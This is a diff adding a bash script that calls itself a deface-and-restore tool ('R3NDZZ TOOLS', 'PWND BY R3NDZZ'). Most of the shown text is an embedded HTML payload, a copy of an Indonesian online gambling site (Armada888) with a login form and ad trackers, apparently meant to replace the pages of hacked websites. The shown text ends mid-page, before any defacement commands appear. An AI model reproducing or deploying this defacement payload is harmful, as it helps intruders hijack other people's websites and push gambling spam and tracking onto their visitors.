@@ -1,0 +1,3325 @@
+#!/bin/bash
+
+# ==============================================
+# R3NDZZ TOOLS - DEFACE & PULIHKAN
+# [ Simple 2 Menu ]
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+# ==============================================
+# KONFIGURASI
+# ==============================================
+BACKUP_DIR="/root/backup_web_$(date +%Y%m%d_%H%M%S)"
+IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+
+# ==============================================
+# HTML DEFACE - PWND BY R3NDZZ
+# ==============================================
+HTML_CONTENT='<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-EMXF71QT3Y">
+    </script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+        function gtag(){window.dataLayer.push(arguments);}
+        gtag(&#39;js&#39;, new Date());
+    
+        gtag(&#39;config&#39;, &#34;G-EMXF71QT3Y&#34;);
+    </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
+    <meta name="theme-color" content="#1c2041" />
+    <meta name="msapplication-TileColor" content="#1c2041" />
+    <meta name="msapplication-navbutton-color" content="#1c2041" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="#1c2041" />
+    <!-- Favicon -->
+    <link rel="icon" type="image/webp" href="https://images.linkcdn.cloud/V2/433/favicon/favicon-1810516806.webp" />
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="googlebot" content="noindex, nofollow" />
+    <meta name="googlebot-news" content="noindex" />
+    <!-- Canonical -->
+    <link rel="canonical" href="https://armada888utama.click/" />
+    <!-- End Canonical -->
+    <meta name="description" itemprop="description" content="Armada88 dan armada888 mainkan sekarang game platform disini dengan tingkat kemenangan situs login sangat tinggi memberikan pengalaman bermain unik" />
+    <meta name="keywords" content="armada888, armada88, login armada888" />
+    <title>
+      ARMADA888 - SITUS LOGIN GAME PLATFORM ARMADA88
+    </title>
+    <!-- Custom Tags -->
+    <link rel="amphtml" href="https://armada888z.shop/amp2/" />
+    <meta name="google-site-verification" content="eu4-cPC9QIBsb9PxM_89FY37n7gZhTtx6eWCapzZ4a8" />
+    <meta name="google-site-verification" content="Li5ID4HzUaVqyEP-Q4X9G3Jn2uDXDW0-QwQp1RQgOOE" />
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://18xarmada888.shop/" />
+    <meta property="og:title" content="ARMADA888 | GABUNG SITUS OFFICIAL GAMES ARMADA88" />
+    <meta property="og:description" content="ARMADA888 memberikan bonus dan promosi untuk gabung ke dalam situs official games armada88 yang merupakan permainan yang sangat dicari netizen kita." />
+    <meta property="og:image" content="https://ibb.co.com/8P71Kks" />
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image" />
+    <meta property="twitter:url" content="https://18xarmada888.shop/" />
+    <meta property="twitter:title" content="ARMADA888 | GABUNG SITUS OFFICIAL GAMES ARMADA88" />
+    <meta property="twitter:description" content="ARMADA888 memberikan bonus dan promosi untuk gabung ke dalam situs official games armada88 yang merupakan permainan yang sangat dicari netizen kita." />
+    <meta property="twitter:image" content="https://ibb.co.com/8P71Kks" />
+    <!-- Info Meta Tags -->
+    <meta name="copyright" content="armada888" />
+    <meta name="publisher" content="armada888" />
+    <meta name="language" content="id_ID" />
+    <meta name="rating" content="general" />
+    <meta name="author" content="armada888" />
+    <meta name="robots" content="index, follow" />
+    <!-- Geo Meta Tags -->
+    <meta name="tgn.nation" content="Indonesia" />
+    <meta name="geo.country" content="ID" />
+    <meta name="geo.region" content="ID" />
+    <meta name="geo.placename" content="Indonesia" />
+    <!-- End Custom Tags -->
+    <script type="application/ld+json">
+      {
+  &#34;@context&#34;: &#34;https://schema.org/&#34;,
+  &#34;@type&#34;: &#34;Article&#34;,
+  &#34;mainEntityOfPage&#34;: {
+    &#34;@type&#34;: &#34;WebPage&#34;,
+    &#34;@id&#34;: &#34;https://18xarmada888.shop/&#34;
+  },
+  &#34;headline&#34;: &#34;&#34;,
+  &#34;image&#34;: {
+    &#34;@type&#34;: &#34;ImageObject&#34;,
+    &#34;url&#34;: &#34;&#34;,
+    &#34;width&#34;: &#34;&#34;,
+    &#34;height&#34;: &#34;&#34;
+  },
+  &#34;author&#34;: {
+    &#34;@type&#34;: &#34;Organization&#34;,
+    &#34;name&#34;: &#34;&#34;,
+    &#34;url&#34;: &#34;https://18xarmada888.shop/&#34;
+  },
+  &#34;publisher&#34;: {
+    &#34;@type&#34;: &#34;Organization&#34;,
+    &#34;name&#34;: &#34;&#34;,
+    &#34;logo&#34;: {
+      &#34;@type&#34;: &#34;ImageObject&#34;,
+      &#34;url&#34;: &#34;&#34;,
+      &#34;width&#34;: &#34;&#34;,
+      &#34;height&#34;: &#34;&#34;
+    }
+  },
+  &#34;datePublished&#34;: &#34;2024-10-02&#34;,
+  &#34;dateModified&#34;: &#34;2024-10-02&#34;
+}
+    </script>
+    <link rel="preload" as="font" href="https://18xarmada888.shop/themes/default/font/font-awesome/webfonts/fa-solid-900.woff2" type="font/woff2" crossorigin="anonymous" />
+    <link rel="preload" as="font" href="https://18xarmada888.shop/themes/default/font/font-awesome/webfonts/fa-brands-400.woff2" type="font/woff2" crossorigin="anonymous" />
+    <link rel="stylesheet" type="text/css" href="https://18xarmada888.shop/themes/default/css/global.css" />
+    <link rel="stylesheet" type="text/css" href="https://18xarmada888.shop/themes/default/font/font-awesome/css/all.min.css" />
+    <link rel="stylesheet" id="templateStyle" type="text/css" href="https://18xarmada888.shop/custom/css/style.css" />
+    <link rel="stylesheet" type="text/css" href="https://18xarmada888.shop/themes/default/sass/custom.css?v=2.0.1796" />
+    <!-- FB META PIXEL SCRIPT -->
+    <script>
+      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version=&#39;2.0&#39;;n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,&#39;script&#39;,&#39;https://connect.facebook.net/en_US/fbevents.js&#39;);
+    </script>
+    <!-- END FB META PIXEL SCRIPT -->
+    <!-- SO Pixel Code -->
+    <script>
+      !(function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)};p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[0];n.async=1;n.src=w;g.parentNode.insertBefore(n,g)}})(window,document,&#34;script&#34;,&#34;//res-odx.op-mobile.opera.com/sp.js&#34;,&#34;otag&#34;);
+    </script>
+    <!-- End SO Pixel Code -->
+    <!--- Tiktok Pixel Code -->
+    <script>
+      !function (w, d, t) {
+            w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=[&#34;page&#34;,&#34;track&#34;,&#34;identify&#34;,&#34;instances&#34;,&#34;debug&#34;,&#34;on&#34;,&#34;off&#34;,&#34;once&#34;,&#34;ready&#34;,&#34;alias&#34;,&#34;group&#34;,&#34;enableCookie&#34;,&#34;disableCookie&#34;],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i&lt;ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n&lt;ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i=&#34;https://analytics.tiktok.com/i18n/pixel/events.js&#34;;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement(&#34;script&#34;);o.type=&#34;text/javascript&#34;,o.async=!0,o.src=i+&#34;?sdkid=&#34;+e+&#34;&amp;lib=&#34;+t;var a=document.getElementsByTagName(&#34;script&#34;)[0];a.parentNode.insertBefore(o,a)}
+                    }(window, document, &#39;ttq&#39;);
+    </script>
+    <!--- End Tiktok Pixel Code -->
+  </head>
+  <body>
+    <div class="floating-contact" id="floating-contact-widget">
+      <div class="floating-contact__item">
+        <a href="/cdn-cgi/l/email-protection#47243426352a2623267f7f7f07202a262e2b6924282a" target="_blank" rel="noreferrer">        <span class="email">        <i class="fa fa-envelope"></i>
+</span>
+        Email
+</a>
+        <a href="https://t.me/armada888_official" target="_blank" rel="noreferrer">        <span class="telegram">        <i class="fab fa-telegram-plane"></i>
+</span>
+        Telegram
+</a>
+        <a href="https://mez.ink/alternatifarmada888" target="_blank" rel="noreferrer">        <span class="website">        <i class="fa fa-globe"></i>
+</span>
+        Website
+</a>
+      </div>
+      <div class="floating-contact__button">
+        <div class="static">
+          <i class="fas fa-comment-alt"></i>
+          <p>
+            Kontak Kami
+          </p>
+        </div>
+        <div class="icons">
+          <div class="icons-line">
+            <span>            <i class="fab fa-facebook-messenger"></i>
+</span>
+            <span>            <i class="fab fa-whatsapp"></i>
+</span>
+            <span>            <i class="fab fa-telegram-plane"></i>
+</span>
+            <span>            <i class="fab fa-skype"></i>
+</span>
+            <span>            <i class="far fa-envelope"></i>
+</span>
+            <span>            <i class="fas fa-comments"></i>
+</span>
+            <span>            <i class="fas fa-phone-alt"></i>
+</span>
+            <span>            <i class="fa fa-globe"></i>
+</span>
+          </div>
+        </div>
+        <div class="btn-close">
+          <i class="fas fa-times"></i>
+        </div>
+      </div>
+    </div>
+    <header class="header">
+      <div class="header__top">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-3 d-flex align-items-center">
+              <div class="header-time" id="headerTime">
+              </div>
+            </div>
+            <div class="col-lg-6 d-flex align-items-center">
+              <div class="header-marquee">
+                <i class="fas fa-bullhorn"></i>
+                <marquee class="marquee">
+                  ARMADA888 AGEN MPO RESMI &amp; TERPERCAYA | JACKPOT BERAPAPUN DIBAYAR LUNAS | SISTEM AMAN &amp; CEPAT
+                </marquee>
+              </div>
+            </div>
+            <div class="col-lg-3">
+              <div class="header-icons">
+                <a href="https://18xarmada888.shop/help">                <i class="fas fa-info" title="Bantuan"></i>
+</a>
+                <div id="header-currency" class="header-flag mr-3">
+                  <span>                  Rupiah
+</span>
+                </div>
+                <div id="header-lang" class="header-flag">
+                  <img src="https://images.linkcdn.cloud/global/default/icon/lang/indonesia.png" alt="id" />
+                  <i class="fas fa-caret-down"></i>
+                  <div id="lang-dropdown" class="flag-dropdown">
+                    <a href="javascript:;" data-locale="en" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/english.png" alt="en" />
+                      <span>                      English
+</span>
+                    </div>
+</a>
+                    <a href="javascript:;" data-locale="id" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/indonesia.png" alt="id" />
+                      <span>                      Indonesia
+</span>
+                    </div>
+</a>
+                    <a href="javascript:;" data-locale="th" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/thai.png" alt="th" />
+                      <span>                      Thailand
+</span>
+                    </div>
+</a>
+                    <a href="javascript:;" data-locale="vn" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/vietnam.png" alt="vn" />
+                      <span>                      Viet
+</span>
+                    </div>
+</a>
+                    <a href="javascript:;" data-locale="kh" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/cambodia.png" alt="kh" />
+                      <span>                      Khmer
+</span>
+                    </div>
+</a>
+                    <a href="javascript:;" data-locale="cn" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/chinese.png" alt="cn" />
+                      <span>                      Chinese
+</span>
+                    </div>
+</a>
+                    <a href="javascript:;" data-locale="tl" name="locale-switch">                    <div class="flag-item">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/lang/philippines.png" alt="tl" />
+                      <span>                      Tagalog
+</span>
+                    </div>
+</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="header__mid">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-3 d-flex align-items-center">
+              <div class="header-logo">
+                <a href="https://18xarmada888.shop">                <img alt="WebsiteLogo" src="https://images.linkcdn.cloud/V2/433/logo/logo-1810516806.webp" width="250" height="54" />
+</a>
+              </div>
+            </div>
+            <div class="col-lg-9">
+              <div class="header-form">
+                <form name="login-form">
+                  <div class="row">
+                    <input value="" name="usernameLogin" type="text" placeholder="Nama Pengguna*" autocomplete="off" style="text-transform: lowercase" required="" />
+                    <div class="position-relative">
+                      <input value="" id="passwordLogin" name="passwordLogin" type="password" placeholder="Kata Sandi*" autocomplete="off" required="" />
+                      <i class="toggle-password fas fa-eye-slash" toggle="#passwordLogin" style="
+    position: absolute;
+    right:0.5rem;
+    top:50%;
+    transform:translateY(-50%);
+    cursor:pointer;
+    color:#808080;
+"></i>
+                    </div>
+                    <button name="buttonLogin" type="submit" class="btn-masuk">
+                      Masuk
+                    </button>
+                    <a id="register" href="https://18xarmada888.shop/register" class="btn-daftar">                    Daftar
+</a>
+                  </div>
+                </form>
+              </div>
+              <div class="header-forgot">
+                <a id="forgot-password" href="https://18xarmada888.shop/forgot-password">                Lupa Kata Sandi ?
+</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <div class="header-nav">
+      <div id="pageLoadingBar" class="progress-bar progress-bar-success" role="progressbar" style="height:4px;width:1%;position:absolute;z-index:999;">
+      </div>
+      <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+            <div class="navbar-nav">
+              <div class="nav-item">
+                <a class="nav-link" href="javascript:;" onclick="routeNav(&#39;/&#39;)">                <i class="fas fa-home" style="font-size: 130%"></i>
+</a>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/slot&#39;)" style="cursor: pointer;">                Slot
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/pragmaticplay&#39;)" href="javascript:;">                      <img title="Pragmatic Play" alt="Pragmatic Play" src="https://images.linkcdn.cloud/global/navbar/slots/pra.webp" />
+                      <div class="game-name">
+                        Pragmatic Play
+                      </div>
+                      <img title="Pragmatic Play" alt="Pragmatic Play" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/fatpanda&#39;)" href="javascript:;">                      <img title="Fat Panda" alt="Fat Panda" src="https://images.linkcdn.cloud/global/navbar/slots/fat.webp" />
+                      <div class="game-name">
+                        Fat Panda
+                      </div>
+                      <img title="Fat Panda" alt="Fat Panda" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/pgsoft&#39;)" href="javascript:;">                      <img title="PG Soft" alt="PG Soft" src="https://images.linkcdn.cloud/global/navbar/slots/pgs.webp" />
+                      <div class="game-name">
+                        PG Soft
+                      </div>
+                      <img title="PG Soft" alt="PG Soft" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/afbgaming&#39;)" href="javascript:;">                      <img title="Afb Gaming" alt="Afb Gaming" src="https://images.linkcdn.cloud/global/navbar/slots/afg.webp" />
+                      <div class="game-name">
+                        Afb Gaming
+                      </div>
+                      <img title="Afb Gaming" alt="Afb Gaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/nextspin&#39;)" href="javascript:;">                      <img title="NEXTSPIN" alt="NEXTSPIN" src="https://images.linkcdn.cloud/global/navbar/slots/nex.webp" />
+                      <div class="game-name">
+                        NEXTSPIN
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/microgaming&#39;)" href="javascript:;">                      <img title="Microgaming" alt="Microgaming" src="https://images.linkcdn.cloud/global/navbar/slots/mic.webp" />
+                      <div class="game-name">
+                        Microgaming
+                      </div>
+                      <img title="Microgaming" alt="Microgaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/advantplay&#39;)" href="javascript:;">                      <img title="Advantplay" alt="Advantplay" src="https://images.linkcdn.cloud/global/navbar/slots/adv.webp" />
+                      <div class="game-name">
+                        Advantplay
+                      </div>
+                      <img title="Advantplay" alt="Advantplay" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/fastspin&#39;)" href="javascript:;">                      <img title="FASTSPIN" alt="FASTSPIN" src="https://images.linkcdn.cloud/global/navbar/slots/fsp.webp" />
+                      <div class="game-name">
+                        FASTSPIN
+                      </div>
+                      <img title="FASTSPIN" alt="FASTSPIN" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/spadegaming&#39;)" href="javascript:;">                      <img title="Spade Gaming" alt="Spade Gaming" src="https://images.linkcdn.cloud/global/navbar/slots/spd.webp" />
+                      <div class="game-name">
+                        Spade Gaming
+                      </div>
+                      <img title="Spade Gaming" alt="Spade Gaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/playtech&#39;)" href="javascript:;">                      <img title="Playtech Slot" alt="Playtech Slot" src="https://images.linkcdn.cloud/global/navbar/slots/pla.webp" />
+                      <div class="game-name">
+                        Playtech Slot
+                      </div>
+                      <img title="Playtech Slot" alt="Playtech Slot" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/joker&#39;)" href="javascript:;">                      <img title="Joker Gaming" alt="Joker Gaming" src="https://images.linkcdn.cloud/global/navbar/slots/jok.webp" />
+                      <div class="game-name">
+                        Joker Gaming
+                      </div>
+                      <img title="Joker Gaming" alt="Joker Gaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/wonwon&#39;)" href="javascript:;">                      <img title="WONWON" alt="WONWON" src="https://images.linkcdn.cloud/global/navbar/slots/won.webp" />
+                      <div class="game-name">
+                        WONWON
+                      </div>
+                      <img title="WONWON" alt="WONWON" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/slot/gbgame&#39;)" href="javascript:;">                      <img title="GB Game" alt="GB Game" src="https://images.linkcdn.cloud/global/navbar/slots/hcg.webp" />
+                      <div class="game-name">
+                        GB Game
+                      </div>
+                      <img title="GB Game" alt="GB Game" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/besoft&#39;)" href="javascript:;">                      <img title="BESOFT" alt="BESOFT" src="https://images.linkcdn.cloud/global/navbar/slots/bsf.webp" />
+                      <div class="game-name">
+                        BESOFT
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/playstar&#39;)" href="javascript:;">                      <img title="Playstar" alt="Playstar" src="https://images.linkcdn.cloud/global/navbar/slots/pls.webp" />
+                      <div class="game-name">
+                        Playstar
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/nolimitcity&#39;)" href="javascript:;">                      <img title="NoLimit City" alt="NoLimit City" src="https://images.linkcdn.cloud/global/navbar/slots/nlc.webp" />
+                      <div class="game-name">
+                        NoLimit City
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/redtiger&#39;)" href="javascript:;">                      <img title="RED TIGER" alt="RED TIGER" src=" https://images.linkcdn.cloud/global/navbar/slots/rtr.webp " />
+                      <div class="game-name">
+                        RED TIGER
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/cq9&#39;)" href="javascript:;">                      <img title="CQ9 Gaming" alt="CQ9 Gaming" src="https://images.linkcdn.cloud/global/navbar/slots/cq9.webp" />
+                      <div class="game-name">
+                        CQ9 Gaming
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/fachai&#39;)" href="javascript:;">                      <img title="Fa Chai" alt="Fa Chai" src="https://images.linkcdn.cloud/global/navbar/slots/fac.webp" />
+                      <div class="game-name">
+                        Fa Chai
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/ygr&#39;)" href="javascript:;">                      <img title="YGR Slot" alt="YGR Slot" src="https://images.linkcdn.cloud/global/navbar/slots/ygr.webp" />
+                      <div class="game-name">
+                        YGR Slot
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/hg5&#39;)" href="javascript:;">                      <img title="HG5" alt="HG5" src="https://images.linkcdn.cloud/global/navbar/slots/hg5.webp" />
+                      <div class="game-name">
+                        HG5
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/rich88&#39;)" href="javascript:;">                      <img title="RICH88" alt="RICH88" src="https://images.linkcdn.cloud/global/navbar/slots/r88.webp" />
+                      <div class="game-name">
+                        RICH88
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/slot4d&#39;)" href="javascript:;">                      <img title="SLOT4D" alt="SLOT4D" src="https://images.linkcdn.cloud/global/navbar/slots/s4d.webp" />
+                      <div class="game-name">
+                        SLOT4D
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/jili&#39;)" href="javascript:;">                      <img title="JILI" alt="JILI" src="https://images.linkcdn.cloud/global/navbar/slots/jli.webp" />
+                      <div class="game-name">
+                        JILI
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/5gs&#39;)" href="javascript:;">                      <img title="5G GAMES" alt="5G GAMES" src="https://images.linkcdn.cloud/global/navbar/slots/5gs.webp" />
+                      <div class="game-name">
+                        5G GAMES
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/mimigaming&#39;)" href="javascript:;">                      <img title="MIMI GAMING" alt="MIMI GAMING" src="https://images.linkcdn.cloud/global/navbar/slots/mmg.webp" />
+                      <div class="game-name">
+                        MIMI GAMING
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/jdb&#39;)" href="javascript:;">                      <img title="JDB" alt="JDB" src="https://images.linkcdn.cloud/global/navbar/slots/jdb.webp" />
+                      <div class="game-name">
+                        JDB
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/habanero&#39;)" href="javascript:;">                      <img title="Habanero" alt="Habanero" src="https://images.linkcdn.cloud/global/navbar/slots/hbn.webp" />
+                      <div class="game-name">
+                        Habanero
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/hydako&#39;)" href="javascript:;">                      <img title="Hydako" alt="Hydako" src="https://images.linkcdn.cloud/global/navbar/slots/hyd.webp" />
+                      <div class="game-name">
+                        Hydako
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/funkygames&#39;)" href="javascript:;">                      <img title="FUNKY GAMES" alt="FUNKY GAMES" src="https://images.linkcdn.cloud/global/navbar/slots/fun.webp" />
+                      <div class="game-name">
+                        FUNKY GAMES
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/slot/wow&#39;)" href="javascript:;">                      <img title="WOW GAMING" alt="WOW GAMING" src="https://images.linkcdn.cloud/global/navbar/slots/wow.webp" />
+                      <div class="game-name">
+                        WOW GAMING
+                      </div>
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/livegames&#39;)" style="cursor: pointer;">                <img src="https://images.linkcdn.cloud/global/nav-addons/hot_category.png" width="30" height="12" style="position: absolute; z-index:999; animation: 0.25s ease 0s infinite alternate none running beat; top:0px;" />
+                Live Game
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="GA28" alt="GA28" src="https://images.linkcdn.cloud/global/navbar/othergame/ga2.webp" />
+                      <div class="game-name">
+                        GA28
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="WS168" alt="WS168" src="https://images.linkcdn.cloud/global/navbar/othergame/ws1.webp" />
+                      <div class="game-name">
+                        WS168
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="SV388 Cockfight" alt="SV388 Cockfight" src="https://images.linkcdn.cloud/global/navbar/othergame/sv3.webp" />
+                      <div class="game-name">
+                        SV388 Cockfight
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="MIKI Gaming" alt="MIKI Gaming" src="https://images.linkcdn.cloud/global/navbar/othergame/mki.webp" />
+                      <div class="game-name">
+                        MIKI Gaming
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="CFA88" alt="CFA88" src="https://images.linkcdn.cloud/global/navbar/sportbook/cfa.webp" />
+                      <div class="game-name">
+                        CFA88
+                      </div>
+                      <img title="CFA88" alt="CFA88" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/new_icon.webp" />
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/casino&#39;)" style="cursor: pointer;">                Casino
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item game-item-new">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="Pragmatic Play LC" alt="Pragmatic Play LC" src="https://images.linkcdn.cloud/global/navbar/casino/plc.webp" />
+                      <div class="game-name">
+                        Pragmatic Play LC
+                      </div>
+                      <img title="Pragmatic Play LC" alt="Pragmatic Play LC" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="Sexy Gaming" alt="Sexy Gaming" src="https://images.linkcdn.cloud/global/navbar/casino/seg.webp" />
+                      <div class="game-name">
+                        Sexy Gaming
+                      </div>
+                      <img title="Sexy Gaming" alt="Sexy Gaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="MICROGAMING LC" alt="MICROGAMING LC" src="https://images.linkcdn.cloud/global/navbar/casino/mlc.webp" />
+                      <div class="game-name">
+                        MICROGAMING LC
+                      </div>
+                      <img title="MICROGAMING LC" alt="MICROGAMING LC" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="Playtech Casino" alt="Playtech Casino" src="https://images.linkcdn.cloud/global/navbar/casino/pca.webp" />
+                      <div class="game-name">
+                        Playtech Casino
+                      </div>
+                      <img title="Playtech Casino" alt="Playtech Casino" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="Evolution" alt="Evolution" src="https://images.linkcdn.cloud/global/navbar/casino/evolution.webp" />
+                      <div class="game-name">
+                        Evolution
